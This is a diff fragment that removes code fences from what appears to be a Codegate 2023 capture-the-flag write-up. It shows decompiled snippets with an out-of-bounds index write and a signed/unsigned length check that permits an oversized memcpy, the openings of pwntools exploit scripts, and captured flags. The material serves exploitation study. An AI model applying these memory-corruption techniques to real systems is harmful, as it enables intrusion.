@@ -12,11 +12,6 @@ struct reg_list {
  uint8_t list[0x10000]; // used when is_free == 0
  }
 };
-```
-
-
-
-```
 /* code snippet in function 0x16F0 */
 // obtain the register value
 v17 = (reg_list *)*registers;
@@ -24,11 +19,6 @@ v17 = (reg_list *)*registers;
 sleep(1u);
 // write element at index specified by the third byte to immediate number specified by the forth byte
 v17->list[(unsigned __int8)ptr->third_byte] = ptr->high_byte;
-```
-
-
-
-```
 from pwn import *
 
 context(log_level='info')
@@ -78,11 +68,6 @@ sh.interactive()
 
 # codegate2023{a77f1e5998a7d38c0e1f77274a344f142a7ff9d167e1419d41d6489fb138bb45}
 # codegate2023{a77f1e5998a7d38c0e1f77274a344f142a7ff9d167e1419d41d6489fb138b044}
-```
-
-
-
-```
 if ( (char)last_byte <= 16 && len ) // signed comparison, so negative byte can pass the check
 {
  while ( last_byte > i ) // unsigned comparison
@@ -97,11 +82,6 @@ if ( (char)last_byte <= 16 && len ) // signed comparison, so negative byte can p
  *new_len = v12;
  qmemcpy(dst, src, v12);
 }
-```
-
-
-
-```
 from pwn import *
 from Crypto.Cipher import AES
 from binascii import *
